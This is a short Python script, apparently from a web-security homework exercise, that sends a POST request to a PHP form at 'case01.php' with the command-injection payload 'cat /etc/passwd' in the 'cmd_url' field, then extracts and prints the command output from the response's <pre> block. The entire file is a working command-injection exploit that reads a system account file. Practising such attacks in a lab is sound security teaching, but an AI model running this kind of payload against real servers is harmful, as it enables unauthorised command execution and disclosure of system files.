import requests

# do POST to the form
url = 'http://www.wsb.com/Homework3/case01.php'
# prepare the value of the form which includes the attack payload
payload = {'cmd_url': 'cat /etc/passwd'}

response = requests.post(url, data=payload)

pre_start = response.text.find('<pre>')
pre_end = response.text.find('</pre>')

pre_text = response.text[pre_start+len('<pre>'):pre_end]

print(pre_text)
